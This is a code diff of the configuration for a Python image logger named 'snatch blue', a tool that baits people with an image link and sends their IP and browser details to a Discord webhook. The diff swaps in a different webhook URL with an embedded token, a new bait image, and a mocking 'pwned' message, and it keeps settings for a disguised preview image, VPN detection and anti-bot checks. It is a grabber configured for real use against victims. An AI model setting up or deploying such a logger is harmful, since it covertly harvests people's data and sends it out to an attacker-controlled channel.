@@ -5,7 +5,7 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser 
+import traceback, requests, base64, httpagentparser
 
 __app__ = "snatch blue"
 __description__ = "just an info collecting tool"
@@ -14,8 +14,8 @@ __author__ = "fishyramen"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1449876102259540019/k1VckSHUu1evEuDboAUJuKVi6eex0zuryB7M-raD0uksEY9iPvV7WxP2JMv-a09ZTHSt",
-    "image": "https://imgs.search.brave.com/dzonTxLvhT2hEtQATlL-WUgB8JUQSpZcflsukacQaKA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWcu/aWZ1bm55LmNvL2lt/YWdlcy9jYjQ0ZWMx/YTRiZDY4OWQ5NDBi/ZWQyMGEwYTkxYTky/YjhjNmQ4MmM2MTJj/OTBiZWMwN2Q1M2Rk/OTdiNTEzZDU0XzEu/anBn", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1469081437859741904/Mhf8qAenyS_C8962tfVBAzVY0cH4xrcNcvX8HMysBfz5NW7Lfg6By9EVWHXHVd6F9Hwa",
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -30,7 +30,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "LMAO u got got bro bro..", # Message to show
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -39,7 +39,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
